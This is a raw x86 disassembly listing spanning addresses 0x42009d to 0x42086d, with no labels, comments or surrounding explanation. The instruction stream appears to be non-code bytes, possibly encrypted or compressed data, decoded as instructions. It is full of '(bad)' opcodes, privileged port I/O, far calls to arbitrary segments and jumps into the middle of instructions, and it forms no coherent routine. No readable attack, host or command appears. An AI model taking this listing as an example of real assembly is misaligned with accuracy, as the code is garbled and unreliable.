  42009d:	(bad)  
  42009f:	inc    edi
  4200a0:	or     edi,edi
  4200a2:	ins    DWORD PTR es:[edi],dx
  4200a3:	lds    edx,FWORD PTR [edi+0x26]
  4200a6:	mov    BYTE PTR ds:0x647d3bfc,ch
  4200ac:	neg    BYTE PTR [eax-0x13]
  4200af:	imul   esp,DWORD PTR [edi+0x5a],0x11891ffb
  4200b6:	(bad)  
  4200b7:	scas   eax,DWORD PTR es:[edi]
  4200b8:	pop    esi
  4200b9:	inc    ebx
  4200ba:	rol    ah,0x69
  4200bd:	xchg   esi,eax
  4200be:	loopne 0x42009e
  4200c0:	loop   0x420107
  4200c2:	les    ebx,FWORD PTR [edi]
  4200c4:	push   ss
  4200c5:	jg     0x4200ef
  4200c7:	lock mov ebx,0x49a76bd0
  4200cd:	dec    esi
  4200ce:	push   edi
  4200cf:	push   ebp
  4200d0:	rcr    DWORD PTR [ebp-0x20],1
  4200d3:	daa    
  4200d4:	cmp    BYTE PTR [ecx],bh
  4200d6:	pop    ebx
  4200d7:	hlt    
  4200d8:	stos   DWORD PTR es:[edi],eax
  4200d9:	dec    esi
  4200da:	inc    eax
  4200db:	jle    0x42015b
  4200dd:	xor    ecx,DWORD PTR gs:[ecx-0x2d819c6d]
  4200e4:	int3   
  4200e5:	mov    eax,ds:0xfaeab327
  4200ea:	xchg   edi,eax
  4200eb:	lds    ecx,FWORD PTR [edi]
  4200ed:	sub    ebx,DWORD PTR [edi+0x15153654]
  4200f3:	pop    esp
  4200f4:	push   esi
  4200f5:	mov    al,ds:0x7e62301c
  4200fa:	cmc    
  4200fb:	(bad)  
  4200fc:	outs   dx,DWORD PTR ds:[esi]
  4200fd:	lahf   
  4200fe:	icebp  
  4200ff:	aam    0xbe
  420101:	dec    esi
  420102:	or     DWORD PTR [eax-0x9],edi
  420105:	fiadd  DWORD PTR [eiz*8+0x47ff91cd]
  42010c:	sbb    eax,0x1d7c47e8
  420111:	inc    esp
  420112:	clc    
  420113:	inc    edx
  420114:	call   0xe57842ab
  420119:	mov    ebp,0xe85d8758
  42011e:	sbb    al,0x71
  420120:	enter  0x6ab6,0x2f
  420124:	fabs   
  420126:	data16 ins BYTE PTR es:[edi],dx
  420128:	add    BYTE PTR [edi-0x6b],bh
  42012b:	lods   eax,DWORD PTR ds:[esi]
  42012c:	inc    ebp
  42012d:	addr16 dec edi
  42012f:	sub    ch,bh
  420131:	mov    edx,0x5858494
  420136:	call   0xc972:0x11cfedb2
  42013d:	mov    bh,0xd9
  42013f:	repnz aad 0x5c
  420142:	cli    
  420143:	dec    esi
  420144:	pop    ds
  420145:	out    dx,al
  420146:	adc    eax,0x43bb64b8
  42014b:	stc    
  42014c:	ds and eax,0x7e914b02
  420152:	js     0x4201cc
  420154:	sub    DWORD PTR [edx+0x3858ce83],eax
  42015a:	dec    edi
  42015b:	cmp    esp,ebx
  42015d:	in     al,0x0
  42015f:	xor    eax,0xfbe5e76d
  420164:	cmp    BYTE PTR [ebx],0xcf
  420167:	(bad)  
  420168:	push   cs
  420169:	fisttp WORD PTR [eax-0x31]
  42016c:	sub    bl,BYTE PTR [edx]
  42016e:	adc    edx,DWORD PTR [esi]
  420170:	add    cl,BYTE PTR [ecx+0x3b]
  420173:	cli    
  420174:	sbb    bl,BYTE PTR [edx]
  420176:	fcom   QWORD PTR [ecx-0x5a]
  420179:	jl     0x420155
  42017b:	inc    ebp
  42017c:	and    ebp,DWORD PTR [ebx+0x43]
  42017f:	xchg   bx,ax
  420181:	cmp    DWORD PTR [eax-0x46c4549f],eax
  420187:	fdiv   DWORD PTR [ebx-0x65eda919]
  42018d:	mul    BYTE PTR [esi+edi*2+0x7f]
  420191:	fadd   QWORD PTR [ecx]
  420193:	lods   eax,DWORD PTR ds:[esi]
  420194:	(bad)  
  420195:	ss xchg al,ch
  420198:	inc    edi
  420199:	pop    esi
  42019a:	popa   
  42019b:	inc    esp
  42019c:	jbe    0x420194
  42019e:	mov    bh,BYTE PTR [edx+esi*4+0x6d0e0b7e]
  4201a5:	(bad)  
  4201a7:	sub    ebx,DWORD PTR [edi+0x6e8d691a]
  4201ad:	fmulp  st(7),st
  4201af:	xchg   edi,eax
  4201b0:	test   DWORD PTR [ebp+0x27],esi
  4201b3:	sbb    eax,0x778a395b
  4201b8:	fldenv ds:0x3531d940
  4201be:	ret    0x905e
  4201c1:	pusha  
  4201c2:	dec    edx
  4201c3:	pushf  
  4201c4:	ds or  eax,0x367851b2
  4201ca:	xor    DWORD PTR [edi],0x1ae0c19a
  4201d0:	jne    0x420207
  4201d2:	xor    dl,dh
  4201d4:	cdq    
  4201d5:	dec    ebp
  4201d6:	sub    BYTE PTR [edi],ch
  4201d8:	and    dh,ah
  4201da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4201db:	test   eax,0x42f09ac0
  4201e0:	mov    cl,0x3d
  4201e2:	xchg   ebx,eax
  4201e3:	push   eax
  4201e4:	cmp    DWORD PTR [esi+0x7d],ebx
  4201e7:	mov    ah,0xc2
  4201e9:	test   dh,ah
  4201eb:	ret    
  4201ec:	cmp    BYTE PTR [ecx+0x357d37af],al
  4201f2:	outs   dx,DWORD PTR ds:[esi]
  4201f3:	js     0x420262
  4201f5:	sbb    eax,0xc6bc478f
  4201fa:	pusha  
  4201fb:	vpsllq xmm4,xmm6,xmm7
  4201ff:	xor    DWORD PTR [esi+0x3393d00e],0x323c16a6
  420209:	std    
  42020a:	enter  0x1203,0xb8
  42020e:	out    dx,al
  42020f:	jno    0x42027a
  420211:	aaa    
  420212:	test   edi,edi
  420214:	retf   
  420215:	inc    esi
  420216:	adc    BYTE PTR [edi],bh
  420218:	sbb    ch,0xd3
  42021b:	pop    esp
  42021c:	scas   al,BYTE PTR es:[edi]
  42021d:	outs   dx,BYTE PTR ds:[esi]
  42021e:	mov    bl,0x80
  420220:	add    al,0xa9
  420222:	push   es
  420223:	pop    edi
  420224:	and    DWORD PTR [ecx-0x6a99c916],ebx
  42022a:	les    eax,FWORD PTR [eax+0x730dcc10]
  420230:	std    
  420231:	sub    ah,bl
  420233:	mov    edx,0xb8aab2d6
  420238:	cmp    DWORD PTR [ebp+0x66cf2c87],edx
  42023e:	pop    ss
  42023f:	mov    edi,0xa1ed3cd
  420244:	test   eax,0xd8a63494
  420249:	lea    ecx,[edi]
  42024b:	outs   dx,BYTE PTR ds:[esi]
  42024c:	xor    eax,0x71293d2f
  420251:	scas   eax,DWORD PTR es:[edi]
  420252:	retf   
  420253:	in     al,dx
  420254:	in     eax,dx
  420255:	daa    
  420256:	fld    TBYTE PTR [edx+0x8bfbc8b]
  42025c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42025d:	push   0xffffffdc
  42025f:	gs imul esp,edi,0xfffffff3
  420263:	mov    al,ds:0x8781f32a
  420268:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420269:	addr16 sbb edi,ebp
  42026c:	mov    esi,0x7ba8d326
  420271:	push   ebx
  420272:	loopne 0x420254
  420274:	xchg   ecx,eax
  420275:	sub    bh,BYTE PTR [edi]
  420277:	mov    es,WORD PTR [esi-0x69]
  42027a:	fimul  WORD PTR [esi+0x56270a88]
  420280:	aam    0x66
  420282:	call   0xd0cda9bd
  420287:	(bad)  
  420289:	int    0xb1
  42028b:	sbb    al,0x9f
  42028d:	and    ah,ah
  42028f:	outs   dx,BYTE PTR ds:[esi]
  420290:	and    al,0x86
  420292:	test   BYTE PTR [eax+0x26aa75e0],ch
  420298:	fnsave [edx+0x18]
  42029b:	inc    edi
  42029c:	aas    
  42029d:	repnz sub DWORD PTR [ebx-0x64],ebp
  4202a1:	test   BYTE PTR [eax-0x24],bh
  4202a4:	rcr    DWORD PTR [ecx+eax*2],1
  4202a7:	pop    es
  4202a8:	adc    cl,ah
  4202aa:	dec    ecx
  4202ab:	ins    BYTE PTR es:[edi],dx
  4202ac:	add    bl,BYTE PTR ss:[ecx+0x2f]
  4202b0:	sbb    ch,al
  4202b2:	sbb    eax,edi
  4202b4:	mov    al,ds:0xd6f0209
  4202b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4202ba:	das    
  4202bb:	daa    
  4202bc:	add    bl,ah
  4202be:	mov    dl,0x7d
  4202c0:	inc    ecx
  4202c1:	inc    ecx
  4202c2:	icebp  
  4202c3:	div    esp
  4202c5:	inc    esi
  4202c6:	or     ah,BYTE PTR [eax-0x499dbee2]
  4202cc:	xchg   ebx,eax
  4202cd:	xor    DWORD PTR [edi-0x5a],edx
  4202d0:	pop    esp
  4202d1:	lods   al,BYTE PTR ds:[esi]
  4202d2:	xchg   DWORD PTR [edx+eax*8],edx
  4202d5:	lods   al,BYTE PTR ds:[esi]
  4202d6:	push   es
  4202d7:	push   edi
  4202d8:	lock into 
  4202da:	test   BYTE PTR [ecx-0x56],0xe9
  4202de:	pusha  
  4202df:	popf   
  4202e0:	mov    eax,0x985c4594
  4202e5:	push   ebp
  4202e6:	iret   
  4202e7:	push   edx
  4202e8:	(bad)  
  4202e9:	in     al,dx
  4202ea:	mov    bh,0xc3
  4202ec:	mov    al,0x9d
  4202ee:	jbe    0x420273
  4202f0:	inc    edi
  4202f1:	popf   
  4202f2:	mov    edi,0xee1f48b9
  4202f7:	rcl    DWORD PTR [ebx-0x5e6eec91],1
  4202fd:	push   esp
  4202fe:	add    BYTE PTR [ebx],ah
  420300:	aad    0xd2
  420302:	sahf   
  420303:	push   edx
  420304:	int3   
  420305:	aas    
  420306:	cmp    ah,BYTE PTR [ebx-0x68]
  420309:	aaa    
  42030a:	mov    ecx,0x37fc72d7
  42030f:	lds    eax,FWORD PTR [ebp+esi*1-0x7d8a4bdb]
  420316:	rcl    DWORD PTR [eax+0x6fa95a8a],1
  42031c:	inc    edi
  42031d:	or     ah,BYTE PTR [edi+0x57ba81ae]
  420323:	fst    DWORD PTR [eax+eiz*8]
  420326:	ja     0x42039c
  420328:	inc    edi
  420329:	mov    eax,DWORD PTR [ebx-0x42ae575b]
  42032f:	sahf   
  420330:	lahf   
  420331:	pop    ebp
  420332:	mov    ebx,0x7e79d7ca
  420337:	fisttp QWORD PTR [ebx-0x6e]
  42033a:	sbb    al,BYTE PTR [ebx]
  42033c:	mov    bh,0x73
  42033e:	cmp    al,0xa3
  420340:	dec    ecx
  420341:	es pop ebp
  420343:	mov    cl,0x1e
  420345:	imul   eax,DWORD PTR [edx-0x4a432818],0x72
  42034c:	(bad)  [ebp-0x54258c81]
  420352:	add    DWORD PTR [eax-0x2c],ebx
  420355:	inc    ecx
  420356:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  420358:	std    
  420359:	dec    ecx
  42035a:	es pop ecx
  42035c:	pop    esi
  42035d:	mov    ebx,0x8f278def
  420362:	inc    edx
  420363:	ret    
  420364:	hlt    
  420365:	inc    esi
  420366:	and    BYTE PTR [ebx-0x7134a587],dl
  42036c:	loopne 0x4203c0
  42036e:	push   edi
  42036f:	jo     0x420371
  420371:	daa    
  420372:	in     eax,0xc4
  420374:	xchg   DWORD PTR [edi],esp
  420376:	fld    DWORD PTR [edx+0x58]
  420379:	pop    edx
  42037a:	or     DWORD PTR [ebx-0x66],ebx
  42037d:	aas    
  42037e:	sub    BYTE PTR [edx-0x5],dl
  420381:	jbe    0x42039b
  420383:	push   edx
  420384:	repnz outs dx,DWORD PTR fs:[esi]
  420387:	leave  
  420388:	sub    DWORD PTR [ebx+0x2b80393e],esi
  42038e:	push   edx
  42038f:	and    ch,BYTE PTR ds:[ebx]
  420392:	call   0x6f5b:0xa69fdceb
  420399:	pop    DWORD PTR [ecx]
  42039b:	pop    edx
  42039c:	xchg   ebp,eax
  42039d:	adc    al,0xd
  42039f:	push   eax
  4203a0:	out    0x80,eax
  4203a2:	adc    BYTE PTR [eax],ah
  4203a4:	xor    dl,BYTE PTR [edi+0x1def4b90]
  4203aa:	cdq    
  4203ab:	je     0x420391
  4203ad:	sub    al,BYTE PTR [ebx-0x2c]
  4203b0:	mov    BYTE PTR [edx-0x27797a45],bh
  4203b6:	mov    ebp,0x3ebd92b1
  4203bb:	test   eax,0x1061b65d
  4203c0:	cmp    ch,ah
  4203c2:	or     ah,0x1d
  4203c5:	leave  
  4203c6:	cwde   
  4203c7:	pop    edi
  4203c8:	pushf  
  4203c9:	inc    ebp
  4203ca:	mov    BYTE PTR [ebx+0xb90f585],bh
  4203d0:	mov    WORD PTR [edi-0x32],cs
  4203d3:	mov    edx,0x81fed3c3
  4203d8:	pusha  
  4203d9:	pop    ebp
  4203da:	and    DWORD PTR [esi-0x14],eax
  4203dd:	cmp    BYTE PTR [edi-0x34],al
  4203e0:	jp     0x4203fd
  4203e2:	push   ds
  4203e3:	and    al,0xe
  4203e5:	lea    eax,[ebx-0x2a]
  4203e8:	dec    esi
  4203e9:	sub    al,0xa8
  4203eb:	dec    edi
  4203ec:	ror    bl,cl
  4203ee:	jbe    0x420405
  4203f0:	lods   eax,DWORD PTR ds:[esi]
  4203f1:	outs   dx,BYTE PTR ds:[esi]
  4203f2:	pop    edx
  4203f3:	mov    al,0x8b
  4203f5:	xor    ecx,DWORD PTR [ecx+0x3633c9b7]
  4203fb:	jnp    0x420419
  4203fd:	scas   eax,DWORD PTR es:[edi]
  4203fe:	out    dx,al
  4203ff:	xor    bh,BYTE PTR [ecx-0x388771d6]
  420405:	pop    ds
  420406:	jl     0x4203c5
  420408:	test   BYTE PTR [esi],0x78
  42040b:	int    0xb9
  42040d:	(bad)  
  42040e:	popa   
  42040f:	test   eax,0x9c3f11b1
  420414:	fptan  
  420416:	dec    BYTE PTR ds:0x93694179
  42041c:	out    0x8d,eax
  42041e:	inc    edi
  42041f:	add    ah,dh
  420421:	pop    es
  420422:	int    0x47
  420424:	cmp    BYTE PTR [edi],ch
  420426:	pop    edi
  420427:	cmp    eax,0xbeaa1734
  42042c:	lock les esp,FWORD PTR [edi+0x1b6eaf8a]
  420433:	int    0x91
  420435:	inc    ecx
  420436:	sub    al,BYTE PTR [ecx-0x478342b6]
  42043c:	das    
  42043d:	sbb    al,0xe9
  42043f:	pop    edx
  420440:	mov    cl,0xcc
  420442:	dec    ebx
  420443:	and    DWORD PTR [edx],ebx
  420445:	ss jmp 0xe42e8377
  42044b:	call   0xef8e:0x5f7c9141
  420452:	adc    esp,esp
  420454:	push   esi
  420455:	ds xchg edi,eax
  420457:	sbb    ebx,DWORD PTR [esi-0x4279e30c]
  42045d:	out    dx,eax
  42045e:	mov    ebx,eax
  420460:	(bad)  
  420461:	inc    ebp
  420462:	test   DWORD PTR [ebp-0x1fe96d2],0xdc2dcc12
  42046c:	xchg   edx,eax
  42046d:	mov    WORD PTR [ecx-0x5d],fs
  420470:	cmc    
  420471:	pop    ebx
  420472:	adc    bl,ch
  420474:	mov    al,ds:0x9d41a23a
  420479:	pop    esp
  42047a:	cmp    eax,0xcd7c7095
  42047f:	push   ss
  420480:	das    
  420481:	out    0x3e,al
  420483:	mov    ds:0x35ce606,al
  420488:	xor    bl,ah
  42048a:	xchg   ebx,eax
  42048b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42048c:	sub    al,0xc4
  42048e:	cli    
  42048f:	lss    edx,FWORD PTR [eax]
  420492:	mov    bl,0xd1
  420494:	dec    ebx
  420495:	dec    edx
  420496:	xchg   ebp,eax
  420497:	jne    0x4204a3
  420499:	mov    ebx,0x1fb2d058
  42049e:	mov    BYTE PTR [edx+0x3f],ah
  4204a1:	or     ebp,edi
  4204a3:	call   0xc23c:0x57cb58e8
  4204aa:	aam    0x3d
  4204ac:	call   0xefb2cc4c
  4204b1:	sbb    ecx,esp
  4204b3:	fiadd  DWORD PTR [edx]
  4204b5:	loop   0x420492
  4204b7:	cwde   
  4204b8:	es push ss
  4204ba:	jmp    0x4aaf:0x426b6d36
  4204c1:	cld    
  4204c2:	in     al,0xf9
  4204c4:	popa   
  4204c5:	jne    0x42045e
  4204c7:	xchg   edi,eax
  4204c8:	clc    
  4204c9:	dec    ebp
  4204ca:	in     al,0xd
  4204cc:	add    dh,bl
  4204ce:	xchg   ebp,eax
  4204cf:	shl    BYTE PTR [eax+0x49],0xe6
  4204d3:	adc    eax,0x2a92df95
  4204d8:	(bad)  
  4204d9:	sar    DWORD PTR [ebp*1-0x69edef21],1
  4204e0:	sbb    esp,DWORD PTR [ecx]
  4204e2:	inc    edi
  4204e3:	jp     0x420551
  4204e5:	retf   0xef86
  4204e8:	xor    BYTE PTR [edi+0x26],ch
  4204eb:	or     al,0xa6
  4204ed:	inc    esi
  4204ee:	leave  
  4204ef:	outs   dx,BYTE PTR ds:[esi]
  4204f0:	les    esp,FWORD PTR es:[eax+eiz*2+0x2146f901]
  4204f8:	adc    BYTE PTR [ecx-0x1d0eae7a],dh
  4204fe:	pop    esp
  4204ff:	cld    
  420500:	dec    ebp
  420501:	pop    ecx
  420502:	or     dl,BYTE PTR [ebx+eiz*1]
  420505:	cmp    BYTE PTR [ecx+eax*4-0x283ab8cf],cl
  42050c:	ret    0x42f1
  42050f:	mov    ch,0xd0
  420511:	add    DWORD PTR [ecx+ecx*1+0x4d],eax
  420515:	jnp    0x420574
  420517:	into   
  420518:	(bad)  
  420519:	dec    esp
  42051a:	sbb    ebp,DWORD PTR [edi-0x413d3251]
  420520:	loop   0x4204c6
  420522:	and    ah,dh
  420524:	cmp    esi,edx
  420526:	in     eax,0x1a
  420528:	js     0x4204d2
  42052a:	sub    edi,DWORD PTR [ebx-0x66]
  42052d:	cmp    al,0xaf
  42052f:	inc    esi
  420530:	fldenv [edi]
  420532:	fsubr  DWORD PTR [eax]
  420534:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420535:	in     eax,0x5
  420537:	test   al,0x28
  420539:	rcl    BYTE PTR ds:0xa6176d7c,0x3f
  420540:	arpl   WORD PTR ds:0x81fe4d9c,si
  420546:	inc    eax
  420547:	push   cs
  420548:	or     ch,cl
  42054a:	test   edx,0x8426dacf
  420550:	jmp    0x4205ce
  420552:	push   esp
  420553:	(bad)  
  420554:	jp     0x420515
  420556:	jno    0x4204f8
  420558:	dec    edi
  420559:	or     BYTE PTR [edx+0x543a1e6f],bl
  42055f:	xor    dl,0x81
  420562:	adc    eax,DWORD PTR ds:0xb36732e
  420568:	std    
  420569:	sar    BYTE PTR [esi-0x530d02ba],1
  42056f:	mov    al,0x3f
  420571:	fbstp  TBYTE PTR [eax+0x34]
  420574:	sbb    DWORD PTR [edi-0x80],esp
  420577:	mov    esp,0x938f5310
  42057c:	adc    al,0x3e
  42057e:	rcl    BYTE PTR [eax],cl
  420580:	jne    0x4205c5
  420582:	mov    ebx,0x9dcf493b
  420587:	sbb    eax,0xa553e87
  42058c:	jnp    0x420571
  42058e:	cmp    ebp,DWORD PTR [edx-0x305583a1]
  420594:	test   BYTE PTR [eax+0x7768bcb4],cl
  42059a:	push   eax
  42059b:	xchg   DWORD PTR [ecx+eiz*8+0x471f3cd3],ecx
  4205a2:	dec    edx
  4205a3:	div    BYTE PTR [ebp+edx*4+0x70]
  4205a7:	dec    eax
  4205a8:	stc    
  4205a9:	pop    ds
  4205aa:	fst    QWORD PTR [esi]
  4205ac:	or     edi,DWORD PTR [edx-0x4e]
  4205af:	xchg   esi,eax
  4205b0:	div    BYTE PTR [edx+ebp*8-0x26]
  4205b4:	inc    ecx
  4205b5:	retf   0xbdc1
  4205b8:	aas    
  4205b9:	int3   
  4205ba:	aas    
  4205bb:	out    dx,al
  4205bc:	jno    0x420634
  4205be:	inc    edi
  4205bf:	jbe    0x420576
  4205c1:	push   ebp
  4205c2:	rcl    bh,cl
  4205c4:	std    
  4205c5:	test   al,0xf1
  4205c7:	add    BYTE PTR [esi-0x48],al
  4205ca:	fistp  WORD PTR [ebx+0x53a0b10f]
  4205d0:	and    DWORD PTR [edi],ecx
  4205d2:	mov    esi,0xe8f7482
  4205d7:	sbb    eax,0x862cbe1a
  4205dc:	mov    BYTE PTR [esi-0x67],dh
  4205df:	in     eax,dx
  4205e0:	mov    esi,DWORD PTR [eax]
  4205e2:	mov    ebp,0x1d406e29
  4205e7:	mov    ds:0x74a03944,eax
  4205ec:	std    
  4205ed:	(bad)  [esi-0x55]
  4205f0:	adc    bl,dl
  4205f2:	or     eax,0x22c7b779
  4205f7:	dec    ebp
  4205f8:	add    al,0x57
  4205fa:	or     ch,BYTE PTR [ecx+0x61954fd9]
  420600:	xor    eax,0x30eec2cc
  420605:	push   esp
  420606:	or     al,0x70
  420608:	or     al,0xd8
  42060a:	inc    edx
  42060b:	add    dl,BYTE PTR [edx+edx*1]
  42060e:	in     al,0x49
  420610:	daa    
  420611:	ins    DWORD PTR es:[edi],dx
  420612:	es rcl dh,cl
  420615:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420616:	push   edx
  420617:	jne    0x4205b9
  420619:	fwait
  42061a:	test   al,0x58
  42061c:	loop   0x4205a7
  42061e:	out    0x46,al
  420620:	mov    al,ds:0xdd9b02b8
  420625:	test   al,0x13
  420627:	(bad)  
  420628:	in     al,dx
  420629:	pop    ebp
  42062a:	mov    ebp,0x6e0bc3e1
  42062f:	lea    eax,[ebp-0x5b]
  420632:	pop    ss
  420633:	loope  0x42065e
  420635:	pushf  
  420636:	mov    esp,0x34fe4703
  42063b:	mov    esp,0x8cc03d38
  420640:	dec    eax
  420641:	mov    ds:0x5dad1299,al
  420646:	cdq    
  420647:	fcomp  st(5)
  420649:	jnp    0x42063c
  42064b:	in     al,0x5b
  42064d:	and    BYTE PTR ds:0xd9619566,0x16
  420654:	push   eax
  420655:	loop   0x420691
  420657:	cmp    BYTE PTR [ebp+0x5dfc480d],dh
  42065d:	fucomip st,st(3)
  42065f:	inc    edx
  420660:	lock push ds
  420662:	mov    DWORD PTR [eax],esp
  420664:	mov    ds:0x1108a998,al
  420669:	mov    ch,0x25
  42066b:	mov    bl,0x1
  42066d:	into   
  42066e:	inc    edx
  42066f:	icebp  
  420670:	mov    ds:0xc1dd991d,al
  420675:	pop    esp
  420676:	fs in  al,0x97
  420679:	jp     0x420660
  42067b:	popf   
  42067c:	iret   
  42067d:	jb     0x420643
  42067f:	loope  0x4206c4
  420681:	pop    ebx
  420682:	inc    ecx
  420683:	popa   
  420684:	lea    ebp,[eax+0x557ea800]
  42068a:	mov    dh,0x81
  42068c:	inc    ebx
  42068d:	sub    dh,BYTE PTR [ebp+0x71]
  420690:	adc    ah,BYTE PTR [eax-0x6917ee65]
  420696:	add    eax,0xdde41c61
  42069b:	sub    edi,DWORD PTR [esi]
  42069d:	push   eax
  42069e:	pusha  
  42069f:	sbb    DWORD PTR [esp+eiz*8-0x5f21a971],ebp
  4206a6:	and    cl,ch
  4206a8:	inc    esp
  4206a9:	int    0x15
  4206ab:	sub    edx,eax
  4206ad:	data16 mov dh,0xc1
  4206b0:	jle    0x420693
  4206b2:	add    eax,0x850942a9
  4206b7:	(bad)  
  4206b8:	sub    BYTE PTR [ecx],dh
  4206ba:	mov    edi,0xb611c6ac
  4206bf:	push   ss
  4206c0:	lds    eax,FWORD PTR [ebp-0x46]
  4206c3:	std    
  4206c4:	dec    edi
  4206c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4206c6:	lds    esi,FWORD PTR [ebx]
  4206c8:	inc    ebx
  4206c9:	mov    al,0x54
  4206cb:	xchg   edi,eax
  4206cc:	dec    ebx
  4206cd:	pop    ecx
  4206ce:	push   0x609b7414
  4206d3:	xor    al,BYTE PTR [edx]
  4206d5:	data16 iretw 
  4206d8:	cmp    al,0xe1
  4206da:	pushf  
  4206db:	push   eax
  4206dc:	push   ebp
  4206dd:	cmp    dh,BYTE PTR [ebp+0xc]
  4206e0:	hlt    
  4206e1:	les    esi,FWORD PTR [eax]
  4206e3:	sbb    ebx,esp
  4206e5:	sub    bh,0xfb
  4206e8:	enter  0x4eda,0x2f
  4206ec:	ret    0x1f99
  4206ef:	mov    dh,0x16
  4206f1:	mov    ch,0x63
  4206f3:	mov    al,0xa7
  4206f5:	or     edi,edi
  4206f7:	xor    edi,ecx
  4206f9:	inc    edx
  4206fa:	cdq    
  4206fb:	xchg   BYTE PTR [ebp-0x5b],bl
  4206fe:	stos   BYTE PTR es:[edi],al
  4206ff:	xchg   esp,eax
  420700:	bound  eax,QWORD PTR ds:[edx-0x30]
  420704:	(bad)  
  420705:	sbb    edi,DWORD PTR [edx]
  420707:	inc    esi
  420708:	and    al,0xa6
  42070a:	xor    edx,edi
  42070c:	shl    ebp,0xa
  42070f:	ret    0xd132
  420712:	and    al,0x3c
  420714:	cmp    ecx,0xffffff84
  420717:	out    dx,al
  420718:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  42071a:	dec    ebp
  42071b:	xchg   ebx,eax
  42071c:	dec    ebp
  42071d:	pop    ebx
  42071e:	xchg   esp,eax
  42071f:	(bad)  
  420720:	stc    
  420721:	cmp    cl,BYTE PTR [eax+0x2]
  420724:	xchg   ebp,eax
  420725:	jg     0x4206ab
  420727:	lods   al,BYTE PTR ds:[esi]
  420728:	int    0x62
  42072a:	addr16 inc edx
  42072c:	sub    eax,0xc303d6fd
  420731:	push   eax
  420732:	cmp    ebx,esp
  420734:	adc    DWORD PTR [edx],0x18
  420737:	xchg   esi,eax
  420738:	enter  0xf2d1,0x8f
  42073c:	xor    al,0xb8
  42073e:	add    ebx,ebp
  420740:	scas   eax,DWORD PTR es:[edi]
  420741:	xchg   edi,eax
  420742:	stos   BYTE PTR es:[edi],al
  420743:	adc    BYTE PTR [edx-0x3a51cbe8],dh
  420749:	cdq    
  42074a:	nop
  42074b:	addr16 (bad) 
  42074d:	dec    ecx
  42074e:	cld    
  42074f:	js     0x420764
  420751:	mov    esi,0x71e0411c
  420756:	pop    ecx
  420757:	fdiv   DWORD PTR [edi-0x70bf4212]
  42075d:	and    DWORD PTR [edi-0x69],ecx
  420760:	jg     0x42075a
  420762:	sub    dh,BYTE PTR [edx]
  420764:	mov    cl,0x5a
  420766:	outs   dx,DWORD PTR ds:[esi]
  420767:	jb     0x42073b
  420769:	icebp  
  42076a:	aas    
  42076b:	push   edx
  42076c:	mov    bl,0xca
  42076e:	pusha  
  42076f:	jge    0x4207e0
  420771:	push   ss
  420772:	imul   edi,esi,0x5d1375dd
  420778:	daa    
  420779:	pop    ecx
  42077a:	ret    
  42077b:	fadd   QWORD PTR [ebp+0x23]
  42077e:	xor    al,0x11
  420780:	cmp    bl,BYTE PTR [eax-0x40]
  420783:	ja     0x4207b3
  420785:	ror    ch,0xdd
  420788:	mov    ebp,0x29f52c2b
  42078d:	add    DWORD PTR [ebx+0x6ddbd0ed],0x86f85b73
  420797:	inc    edx
  420798:	sbb    ebx,ebp
  42079a:	adc    edx,DWORD PTR [esi-0x64]
  42079d:	lods   eax,DWORD PTR ds:[esi]
  42079e:	mov    esp,0xd055bbaa
  4207a3:	dec    eax
  4207a4:	sub    eax,DWORD PTR [eax+0xa4930ea]
  4207aa:	push   ebp
  4207ab:	xor    DWORD PTR [ebx],ecx
  4207ad:	pop    ebp
  4207ae:	cs dec edx
  4207b0:	pop    ebp
  4207b1:	adc    eax,0xf877c260
  4207b6:	pusha  
  4207b7:	mov    bh,0xbf
  4207b9:	xchg   edx,eax
  4207ba:	das    
  4207bb:	das    
  4207bc:	xchg   esi,eax
  4207bd:	test   esi,esp
  4207bf:	call   0x1d3c:0xb254d400
  4207c6:	xchg   edx,eax
  4207c7:	xchg   edi,eax
  4207c8:	fimul  DWORD PTR [esi-0x5db94f68]
  4207ce:	pop    esp
  4207cf:	inc    ecx
  4207d0:	fdivr  QWORD PTR [edx]
  4207d2:	adc    eax,ebp
  4207d4:	ror    eax,0xbd
  4207d7:	test   DWORD PTR [ebp+0xc],0xe36db223
  4207de:	jmp    0x6563dc1b
  4207e3:	xchg   esi,eax
  4207e4:	aad    0x48
  4207e6:	push   ds
  4207e7:	loope  0x42080a
  4207e9:	sub    eax,0x5a2660dc
  4207ee:	xlat   BYTE PTR ds:[ebx]
  4207ef:	sub    BYTE PTR [ebp-0x3b797b8f],dl
  4207f5:	push   es
  4207f6:	jnp    0x420795
  4207f8:	lds    ebx,FWORD PTR [esp+edi*1-0x3]
  4207fc:	dec    esp
  4207fd:	jb     0x420793
  4207ff:	add    edi,DWORD PTR [ebp-0x36]
  420802:	enter  0xbc71,0xd8
  420806:	push   0x95d0957e
  42080b:	mov    ebp,0xac84cbb3
  420810:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420811:	sub    eax,0xd3558f53
  420816:	push   ds
  420817:	dec    esi
  420818:	bound  esi,QWORD PTR [ebp-0x5102fdc4]
  42081e:	cdq    
  42081f:	pushf  
  420820:	loop   0x420863
  420822:	sub    esi,DWORD PTR [ecx]
  420824:	mov    ch,0x5
  420826:	mov    cl,BYTE PTR [edx+0x633a5709]
  42082c:	sub    eax,0xd817344f
  420831:	push   ds
  420832:	cmp    eax,0xd16a7355
  420837:	add    al,0x90
  420839:	mov    esi,0xb8497819
  42083e:	or     al,0xb1
  420840:	inc    esi
  420841:	mov    ch,0x11
  420843:	dec    ebp
  420844:	sub    al,0xb7
  420846:	(bad)  
  420847:	call   0x2846:0xd68f290a
  42084e:	not    BYTE PTR [esi+edx*8]
  420851:	cmova  esi,edi
  420854:	mov    eax,0xbb82b6c7
  420859:	mov    edi,esi
  42085b:	dec    ecx
  42085c:	push   edx
  42085d:	stos   DWORD PTR es:[edi],eax
  42085e:	std    
  42085f:	cdq    
  420860:	ins    BYTE PTR es:[edi],dx
  420861:	int3   
  420862:	adc    eax,0xb84c533c
  420867:	stos   BYTE PTR es:[edi],al
  420868:	pop    eax
  420869:	add    al,0xee
  42086b:	clc    
  42086c:	xchg   esi,eax
  42086d:	js     0x420826
